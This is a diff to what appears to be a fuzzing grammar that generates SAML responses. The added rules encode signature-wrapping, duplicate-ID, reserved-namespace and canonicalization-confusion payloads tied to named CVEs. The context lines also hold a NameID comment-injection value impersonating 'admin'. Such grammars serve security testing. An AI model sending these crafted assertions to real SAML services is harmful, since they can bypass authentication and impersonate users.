@@ -242,6 +242,13 @@
 # --- Extensions element (container for XSW7) ---
 <response_body> = [weight=1] <issuer_elem><nl><status_elem><nl><lt>samlp:Extensions<gt><assertion_elem><lt>/samlp:Extensions<gt><nl><assertion_elem_signed>
 
+# --- StatusDetail container (XSW injection point, CVE-2025-54369) ---
+<response_body> = [weight=1] <issuer_elem><nl><status_with_detail><nl><assertion_elem_signed>
+<status_with_detail> = <lt>samlp:Status<gt><lt>samlp:StatusCode Value=<quot>urn:oasis:names:tc:SAML:2.0:status:Success<quot>/<gt><lt>samlp:StatusDetail<gt><assertion_elem><lt>/samlp:StatusDetail<gt><lt>/samlp:Status<gt>
+
+# --- Response-level signature + unsigned assertion (structural diversity) ---
+<response_body> = [weight=2] <issuer_elem><nl><status_elem><nl><ds_signature><nl><assertion_elem_signed>
+
 # --- XML comment injection points ---
 <nameid_value> = [weight=1] admin<lt>!-- comment --<gt>@evil.com
 <nameid_value> = [weight=1] admin@example.com<lt>!-- --<gt>
@@ -251,3 +258,31 @@
 
 # --- Duplicate ID attribute (S2 attribute pollution) ---
 <assertion_elem> = [weight=1] <lt>saml:Assertion xmlns:saml=<quot><saml_ns><quot> Version=<quot>2.0<quot> ID=<quot><assertion_id><quot> samlp:ID=<quot><assertion_id><quot> IssueInstant=<quot><timestamp><quot><gt><nl><assertion_body><nl><lt>/saml:Assertion<gt>
+
+# --- Reserved NS attribute injection (CVE-2025-66567, Fragile Lock) ---
+<assertion_elem> = [weight=1] <lt>saml:Assertion xmlns:saml=<quot><saml_ns><quot> xml:xmlns=<quot>urn:oasis:names:tc:SAML:2.0:assertion<quot> Version=<quot>2.0<quot> ID=<quot><assertion_id><quot> IssueInstant=<quot><timestamp><quot><gt><nl><assertion_body><nl><lt>/saml:Assertion<gt>
+
+# --- Namespace-prefixed ID duplication (PortSwigger Fragile Lock, G5) ---
+<assertion_elem> = [weight=1] <lt>saml:Assertion xmlns:saml=<quot><saml_ns><quot> Version=<quot>2.0<quot> ID=<quot><assertion_id><quot> saml:ID=<quot><assertion_id><quot> IssueInstant=<quot><timestamp><quot><gt><nl><assertion_body><nl><lt>/saml:Assertion<gt>
+
+# --- Void C14N trigger via relative NS on Response (CVE-2025-66568, G4) ---
+<response_elem> = [weight=1] <lt>samlp:Response xmlns:voidns=<quot>1<quot> <response_attrs><gt><nl><response_body><nl><lt>/samlp:Response<gt>
+
+# --- Holder-of-key SubjectConfirmation ---
+<subject_confirmation> = [weight=1] <lt>saml:SubjectConfirmation Method=<quot>urn:oasis:names:tc:SAML:2.0:cm:holder-of-key<quot><gt><lt>saml:SubjectConfirmationData NotOnOrAfter=<quot><future_timestamp><quot> Recipient=<quot><sp_acs_url><quot>/<gt><lt>/saml:SubjectConfirmation<gt>
+
+# --- Multiple AudienceRestriction ---
+<audience_restriction> = [weight=1] <lt>saml:AudienceRestriction<gt><lt>saml:Audience<gt><audience_value><lt>/saml:Audience<gt><lt>saml:Audience<gt><audience_value><lt>/saml:Audience<gt><lt>/saml:AudienceRestriction<gt>
+
+# --- Signature algorithm diversity ---
+<sig_algorithm> = [weight=1] http://www.w3.org/2001/04/xmldsig-more#rsa-sha224
+<sig_algorithm> = [weight=1] http://www.w3.org/2001/04/xmldsig-more#hmac-sha256
+
+# --- Digest algorithm diversity ---
+<digest_algorithm> = [weight=1] http://www.w3.org/2001/04/xmldsig-more#sha224
+<digest_algorithm> = [weight=1] http://www.w3.org/2001/04/xmldsig-more#sha384
+
+# --- C14N with comments ---
+<c14n_algorithm> = [weight=1] http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments
+<c14n_algorithm> = [weight=1] http://www.w3.org/2006/12/xml-c14n11
+<c14n_algorithm> = [weight=1] http://www.w3.org/2006/12/xml-c14n11#WithComments
